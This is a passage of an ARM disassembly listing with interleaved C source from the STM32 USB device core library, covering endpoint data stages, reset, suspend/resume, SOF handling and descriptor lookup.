 800b35e:	68fb      	ldr	r3, [r7, #12]
 800b360:	f8c3 22d4 	str.w	r2, [r3, #724]	; 0x2d4
          ret = (USBD_StatusTypeDef)pdev->pClass[idx]->DataOut(pdev, epnum);
 800b364:	7dba      	ldrb	r2, [r7, #22]
 800b366:	68fb      	ldr	r3, [r7, #12]
 800b368:	32ae      	adds	r2, #174	; 0xae
 800b36a:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800b36e:	699b      	ldr	r3, [r3, #24]
 800b370:	7afa      	ldrb	r2, [r7, #11]
 800b372:	4611      	mov	r1, r2
 800b374:	68f8      	ldr	r0, [r7, #12]
 800b376:	4798      	blx	r3
 800b378:	4603      	mov	r3, r0
 800b37a:	75fb      	strb	r3, [r7, #23]
        }
      }
      if (ret != USBD_OK)
 800b37c:	7dfb      	ldrb	r3, [r7, #23]
 800b37e:	2b00      	cmp	r3, #0
 800b380:	d001      	beq.n	800b386 <USBD_LL_DataOutStage+0x15c>
      {
        return ret;
 800b382:	7dfb      	ldrb	r3, [r7, #23]
 800b384:	e000      	b.n	800b388 <USBD_LL_DataOutStage+0x15e>
      }
    }
  }

  return USBD_OK;
 800b386:	2300      	movs	r3, #0
}
 800b388:	4618      	mov	r0, r3
 800b38a:	3718      	adds	r7, #24
 800b38c:	46bd      	mov	sp, r7
 800b38e:	bd80      	pop	{r7, pc}

0800b390 <USBD_LL_DataInStage>:
  * @param  epnum: endpoint index
  * @retval status
  */
USBD_StatusTypeDef USBD_LL_DataInStage(USBD_HandleTypeDef *pdev,
                                       uint8_t epnum, uint8_t *pdata)
{
 800b390:	b580      	push	{r7, lr}
 800b392:	b086      	sub	sp, #24
 800b394:	af00      	add	r7, sp, #0
 800b396:	60f8      	str	r0, [r7, #12]
 800b398:	460b      	mov	r3, r1
 800b39a:	607a      	str	r2, [r7, #4]
 800b39c:	72fb      	strb	r3, [r7, #11]
  USBD_EndpointTypeDef *pep;
  USBD_StatusTypeDef ret;
  uint8_t idx;

  if (epnum == 0U)
 800b39e:	7afb      	ldrb	r3, [r7, #11]
 800b3a0:	2b00      	cmp	r3, #0
 800b3a2:	d16f      	bne.n	800b484 <USBD_LL_DataInStage+0xf4>
  {
    pep = &pdev->ep_in[0];
 800b3a4:	68fb      	ldr	r3, [r7, #12]
 800b3a6:	3314      	adds	r3, #20
 800b3a8:	613b      	str	r3, [r7, #16]

    if (pdev->ep0_state == USBD_EP0_DATA_IN)
 800b3aa:	68fb      	ldr	r3, [r7, #12]
 800b3ac:	f8d3 3294 	ldr.w	r3, [r3, #660]	; 0x294
 800b3b0:	2b02      	cmp	r3, #2
 800b3b2:	d15a      	bne.n	800b46a <USBD_LL_DataInStage+0xda>
    {
      if (pep->rem_length > pep->maxpacket)
 800b3b4:	693b      	ldr	r3, [r7, #16]
 800b3b6:	689a      	ldr	r2, [r3, #8]
 800b3b8:	693b      	ldr	r3, [r7, #16]
 800b3ba:	68db      	ldr	r3, [r3, #12]
 800b3bc:	429a      	cmp	r2, r3
 800b3be:	d914      	bls.n	800b3ea <USBD_LL_DataInStage+0x5a>
      {
        pep->rem_length -= pep->maxpacket;
 800b3c0:	693b      	ldr	r3, [r7, #16]
 800b3c2:	689a      	ldr	r2, [r3, #8]
 800b3c4:	693b      	ldr	r3, [r7, #16]
 800b3c6:	68db      	ldr	r3, [r3, #12]
 800b3c8:	1ad2      	subs	r2, r2, r3
 800b3ca:	693b      	ldr	r3, [r7, #16]
 800b3cc:	609a      	str	r2, [r3, #8]

        (void)USBD_CtlContinueSendData(pdev, pdata, pep->rem_length);
 800b3ce:	693b      	ldr	r3, [r7, #16]
 800b3d0:	689b      	ldr	r3, [r3, #8]
 800b3d2:	461a      	mov	r2, r3
 800b3d4:	6879      	ldr	r1, [r7, #4]
 800b3d6:	68f8      	ldr	r0, [r7, #12]
 800b3d8:	f001 f84b 	bl	800c472 <USBD_CtlContinueSendData>

        /* Prepare endpoint for premature end of transfer */
        (void)USBD_LL_PrepareReceive(pdev, 0U, NULL, 0U);
 800b3dc:	2300      	movs	r3, #0
 800b3de:	2200      	movs	r2, #0
 800b3e0:	2100      	movs	r1, #0
 800b3e2:	68f8      	ldr	r0, [r7, #12]
 800b3e4:	f001 fe34 	bl	800d050 <USBD_LL_PrepareReceive>
 800b3e8:	e03f      	b.n	800b46a <USBD_LL_DataInStage+0xda>
      }
      else
      {
        /* last packet is MPS multiple, so send ZLP packet */
        if ((pep->maxpacket == pep->rem_length) &&
 800b3ea:	693b      	ldr	r3, [r7, #16]
 800b3ec:	68da      	ldr	r2, [r3, #12]
 800b3ee:	693b      	ldr	r3, [r7, #16]
 800b3f0:	689b      	ldr	r3, [r3, #8]
 800b3f2:	429a      	cmp	r2, r3
 800b3f4:	d11c      	bne.n	800b430 <USBD_LL_DataInStage+0xa0>
            (pep->total_length >= pep->maxpacket) &&
 800b3f6:	693b      	ldr	r3, [r7, #16]
 800b3f8:	685a      	ldr	r2, [r3, #4]
 800b3fa:	693b      	ldr	r3, [r7, #16]
 800b3fc:	68db      	ldr	r3, [r3, #12]
        if ((pep->maxpacket == pep->rem_length) &&
 800b3fe:	429a      	cmp	r2, r3
 800b400:	d316      	bcc.n	800b430 <USBD_LL_DataInStage+0xa0>
            (pep->total_length < pdev->ep0_data_len))
 800b402:	693b      	ldr	r3, [r7, #16]
 800b404:	685a      	ldr	r2, [r3, #4]
 800b406:	68fb      	ldr	r3, [r7, #12]
 800b408:	f8d3 3298 	ldr.w	r3, [r3, #664]	; 0x298
            (pep->total_length >= pep->maxpacket) &&
 800b40c:	429a      	cmp	r2, r3
 800b40e:	d20f      	bcs.n	800b430 <USBD_LL_DataInStage+0xa0>
        {
          (void)USBD_CtlContinueSendData(pdev, NULL, 0U);
 800b410:	2200      	movs	r2, #0
 800b412:	2100      	movs	r1, #0
 800b414:	68f8      	ldr	r0, [r7, #12]
 800b416:	f001 f82c 	bl	800c472 <USBD_CtlContinueSendData>
          pdev->ep0_data_len = 0U;
 800b41a:	68fb      	ldr	r3, [r7, #12]
 800b41c:	2200      	movs	r2, #0
 800b41e:	f8c3 2298 	str.w	r2, [r3, #664]	; 0x298

          /* Prepare endpoint for premature end of transfer */
          (void)USBD_LL_PrepareReceive(pdev, 0U, NULL, 0U);
 800b422:	2300      	movs	r3, #0
 800b424:	2200      	movs	r2, #0
 800b426:	2100      	movs	r1, #0
 800b428:	68f8      	ldr	r0, [r7, #12]
 800b42a:	f001 fe11 	bl	800d050 <USBD_LL_PrepareReceive>
 800b42e:	e01c      	b.n	800b46a <USBD_LL_DataInStage+0xda>
        }
        else
        {
          if (pdev->dev_state == USBD_STATE_CONFIGURED)
 800b430:	68fb      	ldr	r3, [r7, #12]
 800b432:	f893 329c 	ldrb.w	r3, [r3, #668]	; 0x29c
 800b436:	b2db      	uxtb	r3, r3
 800b438:	2b03      	cmp	r3, #3
 800b43a:	d10f      	bne.n	800b45c <USBD_LL_DataInStage+0xcc>
          {
            if (pdev->pClass[0]->EP0_TxSent != NULL)
 800b43c:	68fb      	ldr	r3, [r7, #12]
 800b43e:	f8d3 32b8 	ldr.w	r3, [r3, #696]	; 0x2b8
 800b442:	68db      	ldr	r3, [r3, #12]
 800b444:	2b00      	cmp	r3, #0
 800b446:	d009      	beq.n	800b45c <USBD_LL_DataInStage+0xcc>
            {
              pdev->classId = 0U;
 800b448:	68fb      	ldr	r3, [r7, #12]
 800b44a:	2200      	movs	r2, #0
 800b44c:	f8c3 22d4 	str.w	r2, [r3, #724]	; 0x2d4
              pdev->pClass[0]->EP0_TxSent(pdev);
 800b450:	68fb      	ldr	r3, [r7, #12]
 800b452:	f8d3 32b8 	ldr.w	r3, [r3, #696]	; 0x2b8
 800b456:	68db      	ldr	r3, [r3, #12]
 800b458:	68f8      	ldr	r0, [r7, #12]
 800b45a:	4798      	blx	r3
            }
          }
          (void)USBD_LL_StallEP(pdev, 0x80U);
 800b45c:	2180      	movs	r1, #128	; 0x80
 800b45e:	68f8      	ldr	r0, [r7, #12]
 800b460:	f001 fcee 	bl	800ce40 <USBD_LL_StallEP>
          (void)USBD_CtlReceiveStatus(pdev);
 800b464:	68f8      	ldr	r0, [r7, #12]
 800b466:	f001 f856 	bl	800c516 <USBD_CtlReceiveStatus>
        }
      }
    }

    if (pdev->dev_test_mode != 0U)
 800b46a:	68fb      	ldr	r3, [r7, #12]
 800b46c:	f893 32a0 	ldrb.w	r3, [r3, #672]	; 0x2a0
 800b470:	2b00      	cmp	r3, #0
 800b472:	d03a      	beq.n	800b4ea <USBD_LL_DataInStage+0x15a>
    {
      (void)USBD_RunTestMode(pdev);
 800b474:	68f8      	ldr	r0, [r7, #12]
 800b476:	f7ff fe42 	bl	800b0fe <USBD_RunTestMode>
      pdev->dev_test_mode = 0U;
 800b47a:	68fb      	ldr	r3, [r7, #12]
 800b47c:	2200      	movs	r2, #0
 800b47e:	f883 22a0 	strb.w	r2, [r3, #672]	; 0x2a0
 800b482:	e032      	b.n	800b4ea <USBD_LL_DataInStage+0x15a>
    }
  }
  else
  {
    /* Get the class index relative to this interface */
    idx = USBD_CoreFindEP(pdev, ((uint8_t)epnum | 0x80U));
 800b484:	7afb      	ldrb	r3, [r7, #11]
 800b486:	f063 037f 	orn	r3, r3, #127	; 0x7f
 800b48a:	b2db      	uxtb	r3, r3
 800b48c:	4619      	mov	r1, r3
 800b48e:	68f8      	ldr	r0, [r7, #12]
 800b490:	f000 f8f3 	bl	800b67a <USBD_CoreFindEP>
 800b494:	4603      	mov	r3, r0
 800b496:	75fb      	strb	r3, [r7, #23]

    if (((uint16_t)idx != 0xFFU) && (idx < USBD_MAX_SUPPORTED_CLASS))
 800b498:	7dfb      	ldrb	r3, [r7, #23]
 800b49a:	2bff      	cmp	r3, #255	; 0xff
 800b49c:	d025      	beq.n	800b4ea <USBD_LL_DataInStage+0x15a>
 800b49e:	7dfb      	ldrb	r3, [r7, #23]
 800b4a0:	2b00      	cmp	r3, #0
 800b4a2:	d122      	bne.n	800b4ea <USBD_LL_DataInStage+0x15a>
    {
      /* Call the class data out function to manage the request */
      if (pdev->dev_state == USBD_STATE_CONFIGURED)
 800b4a4:	68fb      	ldr	r3, [r7, #12]
 800b4a6:	f893 329c 	ldrb.w	r3, [r3, #668]	; 0x29c
 800b4aa:	b2db      	uxtb	r3, r3
 800b4ac:	2b03      	cmp	r3, #3
 800b4ae:	d11c      	bne.n	800b4ea <USBD_LL_DataInStage+0x15a>
      {
        if (pdev->pClass[idx]->DataIn != NULL)
 800b4b0:	7dfa      	ldrb	r2, [r7, #23]
 800b4b2:	68fb      	ldr	r3, [r7, #12]
 800b4b4:	32ae      	adds	r2, #174	; 0xae
 800b4b6:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800b4ba:	695b      	ldr	r3, [r3, #20]
 800b4bc:	2b00      	cmp	r3, #0
 800b4be:	d014      	beq.n	800b4ea <USBD_LL_DataInStage+0x15a>
        {
          pdev->classId = idx;
 800b4c0:	7dfa      	ldrb	r2, [r7, #23]
 800b4c2:	68fb      	ldr	r3, [r7, #12]
 800b4c4:	f8c3 22d4 	str.w	r2, [r3, #724]	; 0x2d4
          ret = (USBD_StatusTypeDef)pdev->pClass[idx]->DataIn(pdev, epnum);
 800b4c8:	7dfa      	ldrb	r2, [r7, #23]
 800b4ca:	68fb      	ldr	r3, [r7, #12]
 800b4cc:	32ae      	adds	r2, #174	; 0xae
 800b4ce:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800b4d2:	695b      	ldr	r3, [r3, #20]
 800b4d4:	7afa      	ldrb	r2, [r7, #11]
 800b4d6:	4611      	mov	r1, r2
 800b4d8:	68f8      	ldr	r0, [r7, #12]
 800b4da:	4798      	blx	r3
 800b4dc:	4603      	mov	r3, r0
 800b4de:	75bb      	strb	r3, [r7, #22]

          if (ret != USBD_OK)
 800b4e0:	7dbb      	ldrb	r3, [r7, #22]
 800b4e2:	2b00      	cmp	r3, #0
 800b4e4:	d001      	beq.n	800b4ea <USBD_LL_DataInStage+0x15a>
          {
            return ret;
 800b4e6:	7dbb      	ldrb	r3, [r7, #22]
 800b4e8:	e000      	b.n	800b4ec <USBD_LL_DataInStage+0x15c>
        }
      }
    }
  }

  return USBD_OK;
 800b4ea:	2300      	movs	r3, #0
}
 800b4ec:	4618      	mov	r0, r3
 800b4ee:	3718      	adds	r7, #24
 800b4f0:	46bd      	mov	sp, r7
 800b4f2:	bd80      	pop	{r7, pc}

0800b4f4 <USBD_LL_Reset>:
  * @param  pdev: device instance
  * @retval status
  */

USBD_StatusTypeDef USBD_LL_Reset(USBD_HandleTypeDef *pdev)
{
 800b4f4:	b580      	push	{r7, lr}
 800b4f6:	b084      	sub	sp, #16
 800b4f8:	af00      	add	r7, sp, #0
 800b4fa:	6078      	str	r0, [r7, #4]
  USBD_StatusTypeDef ret = USBD_OK;
 800b4fc:	2300      	movs	r3, #0
 800b4fe:	73fb      	strb	r3, [r7, #15]

  /* Upon Reset call user call back */
  pdev->dev_state = USBD_STATE_DEFAULT;
 800b500:	687b      	ldr	r3, [r7, #4]
 800b502:	2201      	movs	r2, #1
 800b504:	f883 229c 	strb.w	r2, [r3, #668]	; 0x29c
  pdev->ep0_state = USBD_EP0_IDLE;
 800b508:	687b      	ldr	r3, [r7, #4]
 800b50a:	2200      	movs	r2, #0
 800b50c:	f8c3 2294 	str.w	r2, [r3, #660]	; 0x294
  pdev->dev_config = 0U;
 800b510:	687b      	ldr	r3, [r7, #4]
 800b512:	2200      	movs	r2, #0
 800b514:	605a      	str	r2, [r3, #4]
  pdev->dev_remote_wakeup = 0U;
 800b516:	687b      	ldr	r3, [r7, #4]
 800b518:	2200      	movs	r2, #0
 800b51a:	f8c3 22a4 	str.w	r2, [r3, #676]	; 0x2a4
  pdev->dev_test_mode = 0U;
 800b51e:	687b      	ldr	r3, [r7, #4]
 800b520:	2200      	movs	r2, #0
 800b522:	f883 22a0 	strb.w	r2, [r3, #672]	; 0x2a0
      }
    }
  }
#else

  if (pdev->pClass[0] != NULL)
 800b526:	687b      	ldr	r3, [r7, #4]
 800b528:	f8d3 32b8 	ldr.w	r3, [r3, #696]	; 0x2b8
 800b52c:	2b00      	cmp	r3, #0
 800b52e:	d014      	beq.n	800b55a <USBD_LL_Reset+0x66>
  {
    if (pdev->pClass[0]->DeInit != NULL)
 800b530:	687b      	ldr	r3, [r7, #4]
 800b532:	f8d3 32b8 	ldr.w	r3, [r3, #696]	; 0x2b8
 800b536:	685b      	ldr	r3, [r3, #4]
 800b538:	2b00      	cmp	r3, #0
 800b53a:	d00e      	beq.n	800b55a <USBD_LL_Reset+0x66>
    {
      if (pdev->pClass[0]->DeInit(pdev, (uint8_t)pdev->dev_config) != USBD_OK)
 800b53c:	687b      	ldr	r3, [r7, #4]
 800b53e:	f8d3 32b8 	ldr.w	r3, [r3, #696]	; 0x2b8
 800b542:	685b      	ldr	r3, [r3, #4]
 800b544:	687a      	ldr	r2, [r7, #4]
 800b546:	6852      	ldr	r2, [r2, #4]
 800b548:	b2d2      	uxtb	r2, r2
 800b54a:	4611      	mov	r1, r2
 800b54c:	6878      	ldr	r0, [r7, #4]
 800b54e:	4798      	blx	r3
 800b550:	4603      	mov	r3, r0
 800b552:	2b00      	cmp	r3, #0
 800b554:	d001      	beq.n	800b55a <USBD_LL_Reset+0x66>
      {
        ret = USBD_FAIL;
 800b556:	2303      	movs	r3, #3
 800b558:	73fb      	strb	r3, [r7, #15]
    }
  }
#endif /* USE_USBD_COMPOSITE */

  /* Open EP0 OUT */
  (void)USBD_LL_OpenEP(pdev, 0x00U, USBD_EP_TYPE_CTRL, USB_MAX_EP0_SIZE);
 800b55a:	2340      	movs	r3, #64	; 0x40
 800b55c:	2200      	movs	r2, #0
 800b55e:	2100      	movs	r1, #0
 800b560:	6878      	ldr	r0, [r7, #4]
 800b562:	f001 fbc3 	bl	800ccec <USBD_LL_OpenEP>
  pdev->ep_out[0x00U & 0xFU].is_used = 1U;
 800b566:	687b      	ldr	r3, [r7, #4]
 800b568:	2201      	movs	r2, #1
 800b56a:	f8a3 2164 	strh.w	r2, [r3, #356]	; 0x164

  pdev->ep_out[0].maxpacket = USB_MAX_EP0_SIZE;
 800b56e:	687b      	ldr	r3, [r7, #4]
 800b570:	2240      	movs	r2, #64	; 0x40
 800b572:	f8c3 2160 	str.w	r2, [r3, #352]	; 0x160

  /* Open EP0 IN */
  (void)USBD_LL_OpenEP(pdev, 0x80U, USBD_EP_TYPE_CTRL, USB_MAX_EP0_SIZE);
 800b576:	2340      	movs	r3, #64	; 0x40
 800b578:	2200      	movs	r2, #0
 800b57a:	2180      	movs	r1, #128	; 0x80
 800b57c:	6878      	ldr	r0, [r7, #4]
 800b57e:	f001 fbb5 	bl	800ccec <USBD_LL_OpenEP>
  pdev->ep_in[0x80U & 0xFU].is_used = 1U;
 800b582:	687b      	ldr	r3, [r7, #4]
 800b584:	2201      	movs	r2, #1
 800b586:	849a      	strh	r2, [r3, #36]	; 0x24

  pdev->ep_in[0].maxpacket = USB_MAX_EP0_SIZE;
 800b588:	687b      	ldr	r3, [r7, #4]
 800b58a:	2240      	movs	r2, #64	; 0x40
 800b58c:	621a      	str	r2, [r3, #32]

  return ret;
 800b58e:	7bfb      	ldrb	r3, [r7, #15]
}
 800b590:	4618      	mov	r0, r3
 800b592:	3710      	adds	r7, #16
 800b594:	46bd      	mov	sp, r7
 800b596:	bd80      	pop	{r7, pc}

0800b598 <USBD_LL_SetSpeed>:
  * @param  pdev: device instance
  * @retval status
  */
USBD_StatusTypeDef USBD_LL_SetSpeed(USBD_HandleTypeDef *pdev,
                                    USBD_SpeedTypeDef speed)
{
 800b598:	b480      	push	{r7}
 800b59a:	b083      	sub	sp, #12
 800b59c:	af00      	add	r7, sp, #0
 800b59e:	6078      	str	r0, [r7, #4]
 800b5a0:	460b      	mov	r3, r1
 800b5a2:	70fb      	strb	r3, [r7, #3]
  pdev->dev_speed = speed;
 800b5a4:	687b      	ldr	r3, [r7, #4]
 800b5a6:	78fa      	ldrb	r2, [r7, #3]
 800b5a8:	741a      	strb	r2, [r3, #16]

  return USBD_OK;
 800b5aa:	2300      	movs	r3, #0
}
 800b5ac:	4618      	mov	r0, r3
 800b5ae:	370c      	adds	r7, #12
 800b5b0:	46bd      	mov	sp, r7
 800b5b2:	f85d 7b04 	ldr.w	r7, [sp], #4
 800b5b6:	4770      	bx	lr

0800b5b8 <USBD_LL_Suspend>:
  * @param  pdev: device instance
  * @retval status
  */

USBD_StatusTypeDef USBD_LL_Suspend(USBD_HandleTypeDef *pdev)
{
 800b5b8:	b480      	push	{r7}
 800b5ba:	b083      	sub	sp, #12
 800b5bc:	af00      	add	r7, sp, #0
 800b5be:	6078      	str	r0, [r7, #4]
  if (pdev->dev_state != USBD_STATE_SUSPENDED)
 800b5c0:	687b      	ldr	r3, [r7, #4]
 800b5c2:	f893 329c 	ldrb.w	r3, [r3, #668]	; 0x29c
 800b5c6:	b2db      	uxtb	r3, r3
 800b5c8:	2b04      	cmp	r3, #4
 800b5ca:	d006      	beq.n	800b5da <USBD_LL_Suspend+0x22>
  {
    pdev->dev_old_state = pdev->dev_state;
 800b5cc:	687b      	ldr	r3, [r7, #4]
 800b5ce:	f893 329c 	ldrb.w	r3, [r3, #668]	; 0x29c
 800b5d2:	b2da      	uxtb	r2, r3
 800b5d4:	687b      	ldr	r3, [r7, #4]
 800b5d6:	f883 229d 	strb.w	r2, [r3, #669]	; 0x29d
  }

  pdev->dev_state = USBD_STATE_SUSPENDED;
 800b5da:	687b      	ldr	r3, [r7, #4]
 800b5dc:	2204      	movs	r2, #4
 800b5de:	f883 229c 	strb.w	r2, [r3, #668]	; 0x29c

  return USBD_OK;
 800b5e2:	2300      	movs	r3, #0
}
 800b5e4:	4618      	mov	r0, r3
 800b5e6:	370c      	adds	r7, #12
 800b5e8:	46bd      	mov	sp, r7
 800b5ea:	f85d 7b04 	ldr.w	r7, [sp], #4
 800b5ee:	4770      	bx	lr

0800b5f0 <USBD_LL_Resume>:
  * @param  pdev: device instance
  * @retval status
  */

USBD_StatusTypeDef USBD_LL_Resume(USBD_HandleTypeDef *pdev)
{
 800b5f0:	b480      	push	{r7}
 800b5f2:	b083      	sub	sp, #12
 800b5f4:	af00      	add	r7, sp, #0
 800b5f6:	6078      	str	r0, [r7, #4]
  if (pdev->dev_state == USBD_STATE_SUSPENDED)
 800b5f8:	687b      	ldr	r3, [r7, #4]
 800b5fa:	f893 329c 	ldrb.w	r3, [r3, #668]	; 0x29c
 800b5fe:	b2db      	uxtb	r3, r3
 800b600:	2b04      	cmp	r3, #4
 800b602:	d106      	bne.n	800b612 <USBD_LL_Resume+0x22>
  {
    pdev->dev_state = pdev->dev_old_state;
 800b604:	687b      	ldr	r3, [r7, #4]
 800b606:	f893 329d 	ldrb.w	r3, [r3, #669]	; 0x29d
 800b60a:	b2da      	uxtb	r2, r3
 800b60c:	687b      	ldr	r3, [r7, #4]
 800b60e:	f883 229c 	strb.w	r2, [r3, #668]	; 0x29c
  }

  return USBD_OK;
 800b612:	2300      	movs	r3, #0
}
 800b614:	4618      	mov	r0, r3
 800b616:	370c      	adds	r7, #12
 800b618:	46bd      	mov	sp, r7
 800b61a:	f85d 7b04 	ldr.w	r7, [sp], #4
 800b61e:	4770      	bx	lr

0800b620 <USBD_LL_SOF>:
  * @param  pdev: device instance
  * @retval status
  */

USBD_StatusTypeDef USBD_LL_SOF(USBD_HandleTypeDef *pdev)
{
 800b620:	b580      	push	{r7, lr}
 800b622:	b082      	sub	sp, #8
 800b624:	af00      	add	r7, sp, #0
 800b626:	6078      	str	r0, [r7, #4]
  /* The SOF event can be distributed for all classes that support it */
  if (pdev->dev_state == USBD_STATE_CONFIGURED)
 800b628:	687b      	ldr	r3, [r7, #4]
 800b62a:	f893 329c 	ldrb.w	r3, [r3, #668]	; 0x29c
 800b62e:	b2db      	uxtb	r3, r3
 800b630:	2b03      	cmp	r3, #3
 800b632:	d110      	bne.n	800b656 <USBD_LL_SOF+0x36>
          }
        }
      }
    }
#else
    if (pdev->pClass[0] != NULL)
 800b634:	687b      	ldr	r3, [r7, #4]
 800b636:	f8d3 32b8 	ldr.w	r3, [r3, #696]	; 0x2b8
 800b63a:	2b00      	cmp	r3, #0
 800b63c:	d00b      	beq.n	800b656 <USBD_LL_SOF+0x36>
    {
      if (pdev->pClass[0]->SOF != NULL)
 800b63e:	687b      	ldr	r3, [r7, #4]
 800b640:	f8d3 32b8 	ldr.w	r3, [r3, #696]	; 0x2b8
 800b644:	69db      	ldr	r3, [r3, #28]
 800b646:	2b00      	cmp	r3, #0
 800b648:	d005      	beq.n	800b656 <USBD_LL_SOF+0x36>
      {
        (void)pdev->pClass[0]->SOF(pdev);
 800b64a:	687b      	ldr	r3, [r7, #4]
 800b64c:	f8d3 32b8 	ldr.w	r3, [r3, #696]	; 0x2b8
 800b650:	69db      	ldr	r3, [r3, #28]
 800b652:	6878      	ldr	r0, [r7, #4]
 800b654:	4798      	blx	r3
      }
    }
#endif /* USE_USBD_COMPOSITE */
  }

  return USBD_OK;
 800b656:	2300      	movs	r3, #0
}
 800b658:	4618      	mov	r0, r3
 800b65a:	3708      	adds	r7, #8
 800b65c:	46bd      	mov	sp, r7
 800b65e:	bd80      	pop	{r7, pc}

0800b660 <USBD_CoreFindIF>:
  * @param  pdev: device instance
  * @param  index : selected interface number
  * @retval index of the class using the selected interface number. OxFF if no class found.
  */
uint8_t USBD_CoreFindIF(USBD_HandleTypeDef *pdev, uint8_t index)
{
 800b660:	b480      	push	{r7}
 800b662:	b083      	sub	sp, #12
 800b664:	af00      	add	r7, sp, #0
 800b666:	6078      	str	r0, [r7, #4]
 800b668:	460b      	mov	r3, r1
 800b66a:	70fb      	strb	r3, [r7, #3]
  return 0xFFU;
#else
  UNUSED(pdev);
  UNUSED(index);

  return 0x00U;
 800b66c:	2300      	movs	r3, #0
#endif /* USE_USBD_COMPOSITE */
}
 800b66e:	4618      	mov	r0, r3
 800b670:	370c      	adds	r7, #12
 800b672:	46bd      	mov	sp, r7
 800b674:	f85d 7b04 	ldr.w	r7, [sp], #4
 800b678:	4770      	bx	lr

0800b67a <USBD_CoreFindEP>:
  * @param  pdev: device instance
  * @param  index : selected endpoint number
  * @retval index of the class using the selected endpoint number. 0xFF if no class found.
  */
uint8_t USBD_CoreFindEP(USBD_HandleTypeDef *pdev, uint8_t index)
{
 800b67a:	b480      	push	{r7}
 800b67c:	b083      	sub	sp, #12
 800b67e:	af00      	add	r7, sp, #0
 800b680:	6078      	str	r0, [r7, #4]
 800b682:	460b      	mov	r3, r1
 800b684:	70fb      	strb	r3, [r7, #3]
  return 0xFFU;
#else
  UNUSED(pdev);
  UNUSED(index);

  return 0x00U;
 800b686:	2300      	movs	r3, #0
#endif /* USE_USBD_COMPOSITE */
}
 800b688:	4618      	mov	r0, r3
 800b68a:	370c      	adds	r7, #12
 800b68c:	46bd      	mov	sp, r7
 800b68e:	f85d 7b04 	ldr.w	r7, [sp], #4
 800b692:	4770      	bx	lr

0800b694 <USBD_GetEpDesc>:
  * @param  pConfDesc:  pointer to Bos descriptor
  * @param  EpAddr:  endpoint address
  * @retval pointer to video endpoint descriptor
  */
void *USBD_GetEpDesc(uint8_t *pConfDesc, uint8_t EpAddr)
{
 800b694:	b580      	push	{r7, lr}
 800b696:	b086      	sub	sp, #24
 800b698:	af00      	add	r7, sp, #0
 800b69a:	6078      	str	r0, [r7, #4]
 800b69c:	460b      	mov	r3, r1
 800b69e:	70fb      	strb	r3, [r7, #3]
  USBD_DescHeaderTypeDef *pdesc = (USBD_DescHeaderTypeDef *)(void *)pConfDesc;
 800b6a0:	687b      	ldr	r3, [r7, #4]
 800b6a2:	617b      	str	r3, [r7, #20]
  USBD_ConfigDescTypeDef *desc = (USBD_ConfigDescTypeDef *)(void *)pConfDesc;
 800b6a4:	687b      	ldr	r3, [r7, #4]
 800b6a6:	60fb      	str	r3, [r7, #12]
  USBD_EpDescTypeDef *pEpDesc = NULL;
 800b6a8:	2300      	movs	r3, #0
 800b6aa:	613b      	str	r3, [r7, #16]
  uint16_t ptr;

  if (desc->wTotalLength > desc->bLength)
 800b6ac:	68fb      	ldr	r3, [r7, #12]
 800b6ae:	885b      	ldrh	r3, [r3, #2]
 800b6b0:	b29a      	uxth	r2, r3
 800b6b2:	68fb      	ldr	r3, [r7, #12]
 800b6b4:	781b      	ldrb	r3, [r3, #0]
 800b6b6:	b29b      	uxth	r3, r3
 800b6b8:	429a      	cmp	r2, r3
 800b6ba:	d920      	bls.n	800b6fe <USBD_GetEpDesc+0x6a>
  {
    ptr = desc->bLength;
 800b6bc:	68fb      	ldr	r3, [r7, #12]
 800b6be:	781b      	ldrb	r3, [r3, #0]
 800b6c0:	b29b      	uxth	r3, r3
 800b6c2:	817b      	strh	r3, [r7, #10]

    while (ptr < desc->wTotalLength)
 800b6c4:	e013      	b.n	800b6ee <USBD_GetEpDesc+0x5a>
    {
      pdesc = USBD_GetNextDesc((uint8_t *)pdesc, &ptr);
 800b6c6:	f107 030a 	add.w	r3, r7, #10
 800b6ca:	4619      	mov	r1, r3
 800b6cc:	6978      	ldr	r0, [r7, #20]
 800b6ce:	f000 f81b 	bl	800b708 <USBD_GetNextDesc>
 800b6d2:	6178      	str	r0, [r7, #20]

      if (pdesc->bDescriptorType == USB_DESC_TYPE_ENDPOINT)
 800b6d4:	697b      	ldr	r3, [r7, #20]
 800b6d6:	785b      	ldrb	r3, [r3, #1]
 800b6d8:	2b05      	cmp	r3, #5
 800b6da:	d108      	bne.n	800b6ee <USBD_GetEpDesc+0x5a>
      {
        pEpDesc = (USBD_EpDescTypeDef *)(void *)pdesc;
 800b6dc:	697b      	ldr	r3, [r7, #20]
 800b6de:	613b      	str	r3, [r7, #16]

        if (pEpDesc->bEndpointAddress == EpAddr)
 800b6e0:	693b      	ldr	r3, [r7, #16]
 800b6e2:	789b      	ldrb	r3, [r3, #2]
 800b6e4:	78fa      	ldrb	r2, [r7, #3]
 800b6e6:	429a      	cmp	r2, r3
 800b6e8:	d008      	beq.n	800b6fc <USBD_GetEpDesc+0x68>
        {
          break;
        }
        else
        {
          pEpDesc = NULL;
 800b6ea:	2300      	movs	r3, #0
 800b6ec:	613b      	str	r3, [r7, #16]
    while (ptr < desc->wTotalLength)
 800b6ee:	68fb      	ldr	r3, [r7, #12]
 800b6f0:	885b      	ldrh	r3, [r3, #2]
 800b6f2:	b29a      	uxth	r2, r3
 800b6f4:	897b      	ldrh	r3, [r7, #10]
 800b6f6:	429a      	cmp	r2, r3
 800b6f8:	d8e5      	bhi.n	800b6c6 <USBD_GetEpDesc+0x32>
 800b6fa:	e000      	b.n	800b6fe <USBD_GetEpDesc+0x6a>
          break;
 800b6fc:	bf00      	nop
        }
      }
    }
  }

  return (void *)pEpDesc;
 800b6fe:	693b      	ldr	r3, [r7, #16]
}
 800b700:	4618      	mov	r0, r3
 800b702:	3718      	adds	r7, #24
 800b704:	46bd      	mov	sp, r7
 800b706:	bd80      	pop	{r7, pc}

0800b708 <USBD_GetNextDesc>:
  * @param  buf: Buffer where the descriptor is available
  * @param  ptr: data pointer inside the descriptor
  * @retval next header
  */
USBD_DescHeaderTypeDef *USBD_GetNextDesc(uint8_t *pbuf, uint16_t *ptr)
{
 800b708:	b480      	push	{r7}
 800b70a:	b085      	sub	sp, #20
 800b70c:	af00      	add	r7, sp, #0
 800b70e:	6078      	str	r0, [r7, #4]
 800b710:	6039      	str	r1, [r7, #0]
  USBD_DescHeaderTypeDef *pnext = (USBD_DescHeaderTypeDef *)(void *)pbuf;
 800b712:	687b      	ldr	r3, [r7, #4]
